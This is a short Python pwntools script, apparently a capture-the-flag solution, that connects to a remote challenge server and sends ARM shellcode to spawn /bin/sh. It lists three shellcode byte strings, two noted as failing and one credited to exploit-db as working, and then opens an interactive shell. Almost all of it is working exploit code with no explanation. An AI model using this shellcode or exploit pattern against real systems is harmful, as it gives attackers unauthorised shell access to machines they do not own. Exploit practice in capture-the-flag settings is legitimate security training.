from pwn import *

r = remote('ctf.pwn.sg', 4004)

#r = process('./ftlog')

exploit = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
# exploit did not work

exploit2 = '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68'
#exploit2 did not work

exploit3 = '\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68' 
#exploit 3 somehow worked. Taken from https://www.exploit-db.com/exploits/43520/


print r.recv(1000000)

r.sendline(exploit3)

r.interactive()
